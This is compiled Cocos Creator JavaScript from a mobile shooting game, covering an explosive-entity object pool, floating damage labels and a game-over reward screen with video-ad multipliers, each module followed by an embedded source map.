var Explosive_1 = require("../entities/explosive/Explosive");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameExplosivesController = /** @class */ (function (_super) {
    __extends(GameExplosivesController, _super);
    function GameExplosivesController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.explosiveLayer = null;
        _this._explosiveMap = new Map();
        return _this;
    }
    GameExplosivesController.prototype.genExplosive = function (id) {
        var prefabPath = 'prefab/entities/explosive/explosive' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        this.explosiveLayer.addChild(node);
        var explosive = node.getComponent(Explosive_1.default);
        explosive.init(id);
        var arr = this._explosiveMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._explosiveMap.set(id, arr);
        }
        arr.push(explosive);
        node.active = false;
        return explosive;
    };
    GameExplosivesController.prototype.getInactiveExplosive = function (id) {
        var result = undefined;
        var arr = this._explosiveMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genExplosive(id);
        }
        return result;
    };
    __decorate([
        property(cc.Node)
    ], GameExplosivesController.prototype, "explosiveLayer", void 0);
    GameExplosivesController = __decorate([
        ccclass
    ], GameExplosivesController);
    return GameExplosivesController;
}(cc.Component));
exports.default = GameExplosivesController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZUV4cGxvc2l2ZXNDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSw2REFBd0Q7QUFFbEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBc0QsNENBQVk7SUFBbEU7UUFBQSxxRUFtQ0M7UUFoQ0csb0JBQWMsR0FBVyxJQUFJLENBQUM7UUFFdEIsbUJBQWEsR0FBRyxJQUFJLEdBQUcsRUFBNEIsQ0FBQzs7SUE4QmhFLENBQUM7SUE1QlcsK0NBQVksR0FBcEIsVUFBcUIsRUFBUztRQUMxQixJQUFJLFVBQVUsR0FBRyxxQ0FBcUMsR0FBQyxFQUFFLENBQUM7UUFDMUQsSUFBSSxZQUFZLEdBQUcsRUFBRSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsVUFBVSxFQUFFLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQztRQUMzRCxJQUFJLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLFlBQVksQ0FBQyxDQUFDO1FBQ3hDLElBQUksQ0FBQyxjQUFjLENBQUMsUUFBUSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ25DLElBQUksU0FBUyxHQUFjLElBQUksQ0FBQyxZQUFZLENBQUMsbUJBQVMsQ0FBQyxDQUFDO1FBQ3hELFNBQVMsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLENBQUM7UUFDbkIsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLGFBQWEsQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLENBQUM7UUFDckMsSUFBSSxPQUFPLEdBQUcsSUFBSSxXQUFXLEVBQUM7WUFDMUIsR0FBRyxHQUFHLEVBQUUsQ0FBQztZQUNULElBQUksQ0FBQyxhQUFhLENBQUMsR0FBRyxDQUFDLEVBQUUsRUFBRSxHQUFHLENBQUMsQ0FBQztTQUNuQztRQUNELEdBQUcsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLENBQUM7UUFDcEIsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDcEIsT0FBTyxTQUFTLENBQUM7SUFDckIsQ0FBQztJQUVELHVEQUFvQixHQUFwQixVQUFxQixFQUFTO1FBQzFCLElBQUksTUFBTSxHQUFhLFNBQVMsQ0FBQztRQUNqQyxJQUFJLEdBQUcsR0FBRyxJQUFJLENBQUMsYUFBYSxDQUFDLEdBQUcsQ0FBQyxFQUFFLENBQUMsQ0FBQztRQUNyQyxJQUFJLE9BQU8sR0FBRyxJQUFJLFdBQVcsRUFBQztZQUMxQixNQUFNLEdBQUcsR0FBRyxDQUFDLElBQUksQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxJQUFJLENBQUMsTUFBTSxJQUFJLEtBQUssRUFBMUIsQ0FBMEIsQ0FBQyxDQUFDO1NBQzFEO1FBQ0QsSUFBSSxPQUFPLE1BQU0sSUFBSSxXQUFXLEVBQUM7WUFDN0IsTUFBTSxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLENBQUM7U0FDbEM7UUFDRCxPQUFPLE1BQU0sQ0FBQztJQUNsQixDQUFDO0lBL0JEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7b0VBQ1k7SUFIYix3QkFBd0I7UUFENUMsT0FBTztPQUNhLHdCQUF3QixDQW1DNUM7SUFBRCwrQkFBQztDQW5DRCxBQW1DQyxDQW5DcUQsRUFBRSxDQUFDLFNBQVMsR0FtQ2pFO2tCQW5Db0Isd0JBQXdCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBFeHBsb3NpdmUgZnJvbSBcIi4uL2VudGl0aWVzL2V4cGxvc2l2ZS9FeHBsb3NpdmVcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZUV4cGxvc2l2ZXNDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGV4cGxvc2l2ZUxheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIHByaXZhdGUgX2V4cGxvc2l2ZU1hcCA9IG5ldyBNYXA8bnVtYmVyLCBBcnJheTxFeHBsb3NpdmU+PigpO1xyXG5cclxuICAgIHByaXZhdGUgZ2VuRXhwbG9zaXZlKGlkOm51bWJlcik6RXhwbG9zaXZle1xyXG4gICAgICAgIGxldCBwcmVmYWJQYXRoID0gJ3ByZWZhYi9lbnRpdGllcy9leHBsb3NpdmUvZXhwbG9zaXZlJytpZDtcclxuICAgICAgICBsZXQgZW50aXR5UHJlZmFiID0gY2MubG9hZGVyLmdldFJlcyhwcmVmYWJQYXRoLCBjYy5QcmVmYWIpO1xyXG4gICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUoZW50aXR5UHJlZmFiKTtcclxuICAgICAgICB0aGlzLmV4cGxvc2l2ZUxheWVyLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIGxldCBleHBsb3NpdmUgPSA8RXhwbG9zaXZlPm5vZGUuZ2V0Q29tcG9uZW50KEV4cGxvc2l2ZSk7XHJcbiAgICAgICAgZXhwbG9zaXZlLmluaXQoaWQpO1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLl9leHBsb3NpdmVNYXAuZ2V0KGlkKTtcclxuICAgICAgICBpZiAodHlwZW9mIGFyciA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgYXJyID0gW107XHJcbiAgICAgICAgICAgIHRoaXMuX2V4cGxvc2l2ZU1hcC5zZXQoaWQsIGFycik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGFyci5wdXNoKGV4cGxvc2l2ZSk7XHJcbiAgICAgICAgbm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICByZXR1cm4gZXhwbG9zaXZlO1xyXG4gICAgfVxyXG5cclxuICAgIGdldEluYWN0aXZlRXhwbG9zaXZlKGlkOm51bWJlcik6RXhwbG9zaXZle1xyXG4gICAgICAgIGxldCByZXN1bHQ6RXhwbG9zaXZlID0gdW5kZWZpbmVkO1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLl9leHBsb3NpdmVNYXAuZ2V0KGlkKTtcclxuICAgICAgICBpZiAodHlwZW9mIGFyciAhPSAndW5kZWZpbmVkJyl7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IGFyci5maW5kKHZhbHVlID0+IHZhbHVlLm5vZGUuYWN0aXZlID09IGZhbHNlKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IHRoaXMuZ2VuRXhwbG9zaXZlKGlkKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameLabelsController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f7e2bT6UTxOj6t7XhqyjcZH', 'GameLabelsController');
// script/app/game/GameLabelsController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameLabelsController = /** @class */ (function (_super) {
    __extends(GameLabelsController, _super);
    function GameLabelsController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.labelLayer = null;
        _this.templateLabel = null;
        return _this;
    }
    GameLabelsController.prototype.onLoad = function () {
        window['GameLabelsController'] = this;
    };
    GameLabelsController.prototype.genLabel = function () {
        var labelNode = cc.instantiate(this.templateLabel.node);
        labelNode.active = false;
        this.labelLayer.addChild(labelNode);
        return labelNode.getComponent(cc.Label);
    };
    GameLabelsController.prototype.getInactiveLabel = function () {
        var findNode = this.labelLayer.children.find(function (value) { return value.active == false && value.getComponent(cc.Label); });
        if (findNode) {
            return findNode.getComponent(cc.Label);
        }
        else {
            return this.genLabel();
        }
    };
    /** 飘字 */
    GameLabelsController.prototype.fly = function (str, pos) {
        var label = this.getInactiveLabel();
        label.node.active = true;
        label.string = str;
        label.node.position = pos;
        label.node.color = cc.Color.RED;
        label.node.scale = 0;
        label.node.runAction(cc.sequence(cc.spawn(cc.scaleTo(0.1, 1), cc.fadeTo(0.1, 255), cc.moveBy(0.1, cc.v2(0, 10))), cc.delayTime(0.1), cc.spawn(cc.moveBy(0.3, cc.v2(0, 30)), cc.fadeTo(0.3, 100)), cc.callFunc(function () {
            label.node.active = false;
        })));
    };
    __decorate([
        property(cc.Node)
    ], GameLabelsController.prototype, "labelLayer", void 0);
    __decorate([
        property(cc.Label)
    ], GameLabelsController.prototype, "templateLabel", void 0);
    GameLabelsController = __decorate([
        ccclass
    ], GameLabelsController);
    return GameLabelsController;
}(cc.Component));
exports.default = GameLabelsController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZUxhYmVsc0NvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQWtELHdDQUFZO0lBQTlEO1FBQUEscUVBMENDO1FBdkNHLGdCQUFVLEdBQVcsSUFBSSxDQUFDO1FBRzFCLG1CQUFhLEdBQVksSUFBSSxDQUFDOztJQW9DbEMsQ0FBQztJQWxDRyxxQ0FBTSxHQUFOO1FBQ0ksTUFBTSxDQUFDLHNCQUFzQixDQUFDLEdBQUcsSUFBSSxDQUFDO0lBQzFDLENBQUM7SUFHTyx1Q0FBUSxHQUFoQjtRQUNJLElBQUksU0FBUyxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLGFBQWEsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUN4RCxTQUFTLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUN6QixJQUFJLENBQUMsVUFBVSxDQUFDLFFBQVEsQ0FBQyxTQUFTLENBQUMsQ0FBQztRQUNwQyxPQUFPLFNBQVMsQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQyxDQUFDO0lBQzVDLENBQUM7SUFFRCwrQ0FBZ0IsR0FBaEI7UUFDSSxJQUFJLFFBQVEsR0FBRyxJQUFJLENBQUMsVUFBVSxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsTUFBTSxJQUFJLEtBQUssSUFBSSxLQUFLLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUMsRUFBckQsQ0FBcUQsQ0FBQyxDQUFDO1FBQzdHLElBQUksUUFBUSxFQUFDO1lBQ1QsT0FBTyxRQUFRLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUMsQ0FBQztTQUMxQzthQUFLO1lBQ0YsT0FBTyxJQUFJLENBQUMsUUFBUSxFQUFFLENBQUM7U0FDMUI7SUFDTCxDQUFDO0lBRUQsU0FBUztJQUNULGtDQUFHLEdBQUgsVUFBSSxHQUFVLEVBQUUsR0FBVztRQUN2QixJQUFJLEtBQUssR0FBRyxJQUFJLENBQUMsZ0JBQWdCLEVBQUUsQ0FBQztRQUNwQyxLQUFLLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDekIsS0FBSyxDQUFDLE1BQU0sR0FBRyxHQUFHLENBQUM7UUFDbkIsS0FBSyxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsR0FBRyxDQUFDO1FBQzFCLEtBQUssQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLEVBQUUsQ0FBQyxLQUFLLENBQUMsR0FBRyxDQUFDO1FBRWhDLEtBQUssQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLENBQUMsQ0FBQztRQUNyQixLQUFLLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUMsRUFBRSxDQUFDLE9BQU8sQ0FBQyxHQUFHLEVBQUUsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxHQUFHLEVBQUUsR0FBRyxDQUFDLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxHQUFHLEVBQUUsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxTQUFTLENBQUMsR0FBRyxDQUFDLEVBQUUsRUFBRSxDQUFDLEtBQUssQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLEdBQUcsRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxNQUFNLENBQUMsR0FBRyxFQUFFLEdBQUcsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztZQUMxTSxLQUFLLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDOUIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ1QsQ0FBQztJQXRDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOzREQUNRO0lBRzFCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7K0RBQ1c7SUFOYixvQkFBb0I7UUFEeEMsT0FBTztPQUNhLG9CQUFvQixDQTBDeEM7SUFBRCwyQkFBQztDQTFDRCxBQTBDQyxDQTFDaUQsRUFBRSxDQUFDLFNBQVMsR0EwQzdEO2tCQTFDb0Isb0JBQW9CIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZUxhYmVsc0NvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgbGFiZWxMYXllcjpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICB0ZW1wbGF0ZUxhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB3aW5kb3dbJ0dhbWVMYWJlbHNDb250cm9sbGVyJ10gPSB0aGlzO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBwcml2YXRlIGdlbkxhYmVsKCk6Y2MuTGFiZWx7XHJcbiAgICAgICAgbGV0IGxhYmVsTm9kZSA9IGNjLmluc3RhbnRpYXRlKHRoaXMudGVtcGxhdGVMYWJlbC5ub2RlKTtcclxuICAgICAgICBsYWJlbE5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5sYWJlbExheWVyLmFkZENoaWxkKGxhYmVsTm9kZSk7XHJcbiAgICAgICAgcmV0dXJuIGxhYmVsTm9kZS5nZXRDb21wb25lbnQoY2MuTGFiZWwpO1xyXG4gICAgfVxyXG5cclxuICAgIGdldEluYWN0aXZlTGFiZWwoKTpjYy5MYWJlbHtcclxuICAgICAgICBsZXQgZmluZE5vZGUgPSB0aGlzLmxhYmVsTGF5ZXIuY2hpbGRyZW4uZmluZCh2YWx1ZSA9PiB2YWx1ZS5hY3RpdmUgPT0gZmFsc2UgJiYgdmFsdWUuZ2V0Q29tcG9uZW50KGNjLkxhYmVsKSk7XHJcbiAgICAgICAgaWYgKGZpbmROb2RlKXtcclxuICAgICAgICAgICAgcmV0dXJuIGZpbmROb2RlLmdldENvbXBvbmVudChjYy5MYWJlbCk7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5nZW5MYWJlbCgpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICAvKiog6aOY5a2XICovXHJcbiAgICBmbHkoc3RyOnN0cmluZywgcG9zOmNjLlZlYzIpe1xyXG4gICAgICAgIGxldCBsYWJlbCA9IHRoaXMuZ2V0SW5hY3RpdmVMYWJlbCgpO1xyXG4gICAgICAgIGxhYmVsLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBsYWJlbC5zdHJpbmcgPSBzdHI7XHJcbiAgICAgICAgbGFiZWwubm9kZS5wb3NpdGlvbiA9IHBvcztcclxuICAgICAgICBsYWJlbC5ub2RlLmNvbG9yID0gY2MuQ29sb3IuUkVEO1xyXG5cclxuICAgICAgICBsYWJlbC5ub2RlLnNjYWxlID0gMDtcclxuICAgICAgICBsYWJlbC5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5zcGF3bihjYy5zY2FsZVRvKDAuMSwgMSksIGNjLmZhZGVUbygwLjEsIDI1NSksIGNjLm1vdmVCeSgwLjEsIGNjLnYyKDAsIDEwKSkpLCBjYy5kZWxheVRpbWUoMC4xKSwgY2Muc3Bhd24oY2MubW92ZUJ5KDAuMywgY2MudjIoMCwgMzApKSwgY2MuZmFkZVRvKDAuMywgMTAwKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIGxhYmVsLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSkpKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameOver.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0ff30pjHBFH77CAQSQ7Z0pY', 'GameOver');
// script/app/game/GameOver.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var Extend_1 = require("../../../framework/extend/Extend");
var GameProxy_1 = require("./GameProxy");
var World_1 = require("../info/World");
var GameOverLucky_1 = require("./GameOverLucky");
var Network_1 = require("../network/Network");
var NetworkConfig_1 = require("../config/NetworkConfig");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
//curTime = 80  subTime = 0.6   addTime = 10  max = 100   7次，第8次出误点banner
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameOver = /** @class */ (function (_super) {
    __extends(GameOver, _super);
    function GameOver() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.titleLabel = null;
        _this.topNode = null;
        _this.goldLabel = null;
        _this.videoGoldLabel = null;
        _this.videoMulLabel = null;
        _this.luckyProgressBar = null;
        _this.gameOverLucky = null;
        _this.oneButtonNode = null;
        _this.tripleButtonNode = null;
        _this.luckyButtonNode = null;
        _this.luckyVideoSprite = null;
        _this.inviteSpriteFrame = null;
        _this.videoSpriteFrame = null;
        _this._takeGoldOne = 0;
        _this._videoMul = 3;
        return _this;
    }
    GameOver.prototype.onLoad = function () {
        var _this = this;
        this.oneButtonNode.on(cc.Node.EventType.POSITION_CHANGED, function () {
            _this.luckyButtonNode.parent.position = _this.oneButtonNode.position.add(cc.v2(0, 120));
        });
        cc.game.on("video_5", function () {
            _this.onGameOverTakeDajiangDo();
        }, this);
    };
    GameOver.prototype.onEnable = function () {
        var _this = this;
        this._takeGoldOne = 0;
        this._videoMul = 3;
        this.gameOverLucky.node.active = false;
        this.gameOverLucky.node.zIndex = 10;
        console.log("GameOver===>GameProxy.pauseGame = true");
        GameProxy_1.GameProxy.pauseGame = true;
        // this.oneBackgroundSprite.setMaterial(0, cc.Material.getBuiltinMaterial("2d-gray-sprite"));
        this.node.children.forEach(function (value, index) {
            value.scale = 0;
            value.runAction(cc.sequence(cc.delayTime(1 + 0.08 * index), cc.scaleTo(0.2, 1).easing(cc.easeElasticOut(0.45))));
        });
        World_1.World.Storage.unlockGun = -World_1.World.Storage.unlockGun;
        this.topNode.removeFromParent(false);
        this.node.addChild(this.topNode);
        this.topNode.getChildByName('progress').runAction(cc.sequence(cc.delayTime(0.3), cc.moveBy(0.35, cc.v2(0, -125))));
        this.topNode.getChildByName('level').runAction(cc.sequence(cc.delayTime(0.7), cc.spawn(cc.scaleTo(0.35, 2).easing(cc.easeElasticOut(0.6)), cc.moveBy(0.35, cc.v2(0, -95)).easing(cc.easeElasticOut(0.6)))));
        if (GameProxy_1.GameProxy.killCount >= GameProxy_1.GameProxy.maxEnemyNum) {
            // World.Storage.passLuckyCount++;
            GameProxy_1.GameProxy.goldCount += GameProxy_1.GameProxy.passGold();
            World_1.World.Storage.gameLevel++;
            /** 上传关卡 */
            if (NetworkConfig_1.NetworkConfig.connectServer) {
                Network_1.default.uploadLv(World_1.World.Storage.gameLevel);
            }
            /** 计算解锁最新的一把枪 */
            var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon);
            for (var _i = 0, weaponConfig_1 = weaponConfig; _i < weaponConfig_1.length; _i++) {
                var item = weaponConfig_1[_i];
                if (item['unlock'] == World_1.World.Storage.gameLevel) {
                    World_1.World.Storage.unlockGun = item['id'];
                    break;
                }
            }
        }
        else {
            this.titleLabel.string = "战斗失败";
        }
        this._takeGoldOne = GameProxy_1.GameProxy.goldCount;
        this.goldLabel.string = Extend_1.ext.shortFormat(this._takeGoldOne);
        this.topNode.getChildByName('progress').getChildByName('goldLabel').getComponent(cc.Label).string = this.goldLabel.string;
        this.updateVideo();
        // this.oneButtonNode.active = false;
        // this.scheduleOnce(()=>this.oneButtonNode.active = true, 2);
        this.scheduleOnce(function () {
            _this.luckyButtonNode.parent.runAction(cc.repeatForever(cc.sequence(cc.scaleTo(0.5, 0.95), cc.scaleTo(0.5, 1))));
        }, 2);
    };
    GameOver.prototype.updateVideo = function () {
        this.videoMulLabel.string = "x" + this._videoMul;
        this.videoGoldLabel.string = Extend_1.ext.shortFormat(this._takeGoldOne * this._videoMul);
        this.luckyProgressBar.progress = 1;
        this.tripleButtonNode.active = false;
        // this.luckyProgressBar.progress = World.Storage.passLuckyCount/5;
        // this.tripleButtonNode.active = World.Storage.passLuckyCount < 5;
        this.luckyButtonNode.active = !this.tripleButtonNode.active;
        var spriteFrame = this.inviteSpriteFrame;
        // if (WXADVideo.canPlay()){
        //     spriteFrame = this.videoSpriteFrame;
        // }
        this.luckyVideoSprite.spriteFrame = spriteFrame;
    };
    GameOver.prototype.onGameOverTake = function (event, data) {
        console.log("【video】5 幸运大奖 【Click】GameOver onGameOverTake ", data);
        var num = parseInt(data);
        if (num == 1) {
            if (this._takeGoldOne > 0) {
                World_1.World.Storage.goldCount += this._takeGoldOne;
                Facade_1.default.executeCommand('ShowTipsCommand', "\u91D1\u5E01 +" + Extend_1.ext.shortFormat(this._takeGoldOne));
            }
            this.node.active = false;
            Facade_1.default.executeCommand("LoadSceneCommand", "HomeScene");
        }
        else {
            this.onGameOverTakeDajiang();
        }
    };
    GameOver.prototype.onGameOverTakeDajiang = function () {
        World_1.World.Storage._videoSign = 5;
        World_1.World.Storage.videoAd_show();
    };
    GameOver.prototype.onGameOverTakeDajiangDo = function () {
        var _this = this;
        if (this.luckyProgressBar.progress >= 1) {
            console.log("幸运大奖.");
            this.gameOverLucky.node.active = true;
            var num_1 = Extend_1.ext.randomElement([10, 9, 8, 7, 6, 5, 4]);
            this.gameOverLucky.run(num_1, function () {
                _this._videoMul = num_1;
                // World.Storage.passLuckyCount = 0;
                _this.node.active = false;
                var goldCount = _this._takeGoldOne * _this._videoMul;
                if (goldCount > 0) {
                    World_1.World.Storage.goldCount += goldCount;
                    Facade_1.default.executeCommand('ShowTipsCommand', "\u91D1\u5E01 +" + Extend_1.ext.shortFormat(goldCount));
                }
                Facade_1.default.executeCommand("LoadSceneCommand", "HomeScene");
            });
            return;
        }
        var goldCount = this._takeGoldOne * this._videoMul;
        if (goldCount > 0) {
            World_1.World.Storage.goldCount += goldCount;
            Facade_1.default.executeCommand('ShowTipsCommand', "\u91D1\u5E01 +" + Extend_1.ext.shortFormat(goldCount));
        }
        this.node.active = false;
        Facade_1.default.executeCommand("LoadSceneCommand", "HomeScene");
    };
    __decorate([
        property(cc.Label)
    ], GameOver.prototype, "titleLabel", void 0);
    __decorate([
        property(cc.Node)
    ], GameOver.prototype, "topNode", void 0);
    __decorate([
        property(cc.Label)
    ], GameOver.prototype, "goldLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameOver.prototype, "videoGoldLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameOver.prototype, "videoMulLabel", void 0);
    __decorate([
        property(cc.ProgressBar)
    ], GameOver.prototype, "luckyProgressBar", void 0);
    __decorate([
        property(GameOverLucky_1.default)
    ], GameOver.prototype, "gameOverLucky", void 0);
    __decorate([
        property(cc.Node)
    ], GameOver.prototype, "oneButtonNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameOver.prototype, "tripleButtonNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameOver.prototype, "luckyButtonNode", void 0);
    __decorate([
        property(cc.Sprite)
    ], GameOver.prototype, "luckyVideoSprite", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], GameOver.prototype, "inviteSpriteFrame", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], GameOver.prototype, "videoSpriteFrame", void 0);
    GameOver = __decorate([
        ccclass
    ], GameOver);
    return GameOver;
}(cc.Component));
exports.default = GameOver;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
